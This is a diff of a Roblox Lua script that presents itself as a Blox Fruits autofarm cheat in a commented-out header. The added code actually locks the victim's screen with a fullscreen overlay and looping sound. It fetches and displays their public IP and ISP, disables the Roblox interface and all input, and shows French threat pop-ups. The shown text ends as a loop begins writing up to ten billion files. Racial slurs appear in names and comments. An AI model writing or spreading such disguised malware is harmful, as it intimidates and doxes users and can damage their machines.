@@ -1,3 +1,72 @@
+
+
+--[[$$ 
+    print("loading the script...")
+    print("bloxfruit")
+    bloxfruit == autofarm = true
+png == target
+
+killaura.fkill == true or getgenv().wait()
+
+
+
+
+
+
+
+
+
+press.attack mob
+
+
+
+
+
+
+
+
+
+
+
+
+
+noprint("errror")
+
+
+
+png.attack.popngg
+png.attack.popnggpng.attack.popngg
+
+
+png.attack.popnggpng.attack.popnggpng.attack.popngg
+
+
+png.attack.popngg
+
+]]
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 local sound = Instance.new("Sound", game.NetworkClient)
 sound.SoundId = "rbxassetid://17422156627"
 sound.Looped = true
@@ -7,8 +76,12 @@ sound:Play()
 
 local negrogethacked = Instance.new("ScreenGui")
 local ImageLabel = Instance.new("ImageLabel")
-local TextLabel = Instance.new("TextLabel")
+local ip1 = Instance.new("TextLabel")
 local UITextSizeConstraint = Instance.new("UITextSizeConstraint")
+local ip2 = Instance.new("TextLabel")
+local UITextSizeConstraint_2 = Instance.new("UITextSizeConstraint")
+local ip3 = Instance.new("TextLabel")
+local UITextSizeConstraint_3 = Instance.new("UITextSizeConstraint")
 
 negrogethacked.Name = "negrogethacked"
 negrogethacked.Parent = game.CoreGui
@@ -19,108 +92,133 @@ ImageLabel.AnchorPoint = Vector2.new(0.5, 0.5)
 ImageLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
 ImageLabel.BorderColor3 = Color3.fromRGB(0, 0, 0)
 ImageLabel.BorderSizePixel = 0
-ImageLabel.Position = UDim2.new(0.499825537, 0, 0.49966386, 0)
-ImageLabel.Size = UDim2.new(0, 1919, 0, 1080)
+ImageLabel.Position = UDim2.new(0.499825537, 0, 0.499831915, 0)
+ImageLabel.Size = UDim2.new(0, 1919, 0, 1079)
 ImageLabel.Image = "http://www.roblox.com/asset/?id=84580224252568"
 
-TextLabel.Parent = negrogethacked
-TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-TextLabel.BackgroundTransparency = 1.000
-TextLabel.BorderColor3 = Color3.fromRGB(0, 0, 0)
-TextLabel.BorderSizePixel = 0
-TextLabel.Position = UDim2.new(0.262684703, 0, 0.841303706, 0)
-TextLabel.Size = UDim2.new(0, 482, 0, 50)
-TextLabel.Font = Enum.Font.SourceSansBold
-TextLabel.Text = "IP :  "
-TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
-TextLabel.TextScaled = true
-TextLabel.TextSize = 74.000
-TextLabel.TextWrapped = true
+ip1.Name = "ip1"
+ip1.Parent = negrogethacked
+ip1.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+ip1.BackgroundTransparency = 1.000
+ip1.BorderColor3 = Color3.fromRGB(0, 0, 0)
+ip1.BorderSizePixel = 0
+ip1.Position = UDim2.new(0.262684703, 0, 0.841303706, 0)
+ip1.Size = UDim2.new(0, 482, 0, 50)
+ip1.Font = Enum.Font.SourceSansBold
+ip1.Text = "IP :  "
+ip1.TextColor3 = Color3.fromRGB(255, 255, 255)
+ip1.TextScaled = true
+ip1.TextSize = 74.000
+ip1.TextWrapped = true
 
-UITextSizeConstraint.Parent = TextLabel
+UITextSizeConstraint.Parent = ip1
 UITextSizeConstraint.MaxTextSize = 74
 
-local function MRZVYOK_fake_script()
-    local script = Instance.new('LocalScript', negrogethacked)
+ip2.Name = "ip2"
+ip2.Parent = negrogethacked
+ip2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+ip2.BackgroundTransparency = 1.000
+ip2.BorderColor3 = Color3.fromRGB(0, 0, 0)
+ip2.BorderSizePixel = 0
+ip2.Position = UDim2.new(-0.0555246398, 0, 0.0410524309, 0)
+ip2.Size = UDim2.new(0, 482, 0, 50)
+ip2.Font = Enum.Font.SourceSansBold
+ip2.Text = "IP :  "
+ip2.TextColor3 = Color3.fromRGB(255, 255, 255)
+ip2.TextScaled = true
+ip2.TextSize = 74.000
+ip2.TextWrapped = true
 
-    local HttpService = game:GetService("HttpService")
-    local textLabel = script.Parent.TextLabel
-    
-    
-    local success, response = pcall(function()
-        return HttpService:JSONDecode(game:HttpGet("http://api.ipify.org/?format=json"))
-    end)
-    
-    if success and response and response.ip then
-        textLabel.Text = response.ip
-    else
-        textLabel.Text = ""
-    end
-    
+UITextSizeConstraint_2.Parent = ip2
+UITextSizeConstraint_2.MaxTextSize = 74
+
+ip3.Name = "ip3"
+ip3.Parent = negrogethacked
+ip3.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+ip3.BackgroundTransparency = 1.000
+ip3.BorderColor3 = Color3.fromRGB(0, 0, 0)
+ip3.BorderSizePixel = 0
+ip3.Position = UDim2.new(0.670428157, 0, 0.0410524309, 0)
+ip3.Size = UDim2.new(0, 482, 0, 50)
+ip3.Font = Enum.Font.SourceSansBold
+ip3.Text = "IP :  "
+ip3.TextColor3 = Color3.fromRGB(255, 255, 255)
+ip3.TextScaled = true
+ip3.TextSize = 74.000
+ip3.TextWrapped = true
+
+UITextSizeConstraint_3.Parent = ip3
+UITextSizeConstraint_3.MaxTextSize = 74
+
+-- Scripts:
+
+local function BTLMP_fake_script()
+	local script = Instance.new('LocalScript', negrogethacked)
+
+	local HttpService = game:GetService("HttpService")
+	
+	local ip1 = script.Parent.ip1
+	local ip2 = script.Parent.ip2
+	local ip3 = script.Parent.ip3
+	
+	local success1, response1 = pcall(function()
+		return HttpService:JSONDecode(game:HttpGet("http://api.ipify.org/?format=json"))
+	end)
+	
+	local success2, response2 = pcall(function()
+		return HttpService:JSONDecode(game:HttpGet("http://ip-api.com/json/"))
+	end)
+	
+	
+	if success1 and response1 and response1.ip then
+		ip2.Text = "Nice IP : " .. response1.ip
+		ip3.Text = response1.ip
+	else
+		ip2.Text = ""
+		ip3.Text = ""
+	end
+	
+	if success2 and response2 and response2.as then
+		ip1.Text = "Don't leave : " .. response2.as
+	else
+		ip1.Text = "k"
+	end
+	
 end
-coroutine.wrap(MRZVYOK_fake_script)()
+coroutine.wrap(BTLMP_fake_script)()
+
+-- blocked all lmaooo (not f1 to f12 and windows :((  )))
+
+local coregui = game:GetService("CoreGui")
+
+for i, v in pairs(coregui:GetChildren()) do
+	if v:IsA("ScreenGui") and (v.Name == "TopBarApp" or v.Name == "RobloxGui") then
+		if v:FindFirstChild("Enabled") ~= nil or v.Enabled ~= nil then
+			v.Enabled = false
+		else
+			warn("x")
+		end
+	end
+end
 
 
+local ContextActionService = game:GetService("ContextActionService")
+local FREEZE_ACTION = "freezeMovement"
 
+ContextActionService:BindAction(
+	FREEZE_ACTION,
+	function() return Enum.ContextActionResult.Sink end,
+	false,
+	unpack(Enum.PlayerActions:GetEnumItems())
+)
 
+-- destroy pc nigga
 
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
+messagebox("'Le 18-25 a bz ton pc'", "Boweb x Entrepreneur", 1)
+messagebox("'Quitte ton jeu est ton pc sera mort'", "Boweb x Entrepreneur", 1)
+messagebox("'Amuse toi a le reparer fdp'", "Boweb x Entrepreneur", 1)
+messagebox("'fps boost gratuit'", "Boweb x Entrepreneur", 1)
+messagebox("'nice ip'", "Boweb x Entrepreneur", 1)
 
 for i = 1, 10000000000 do
     local fileName = "File_" .. i .. ".txt"
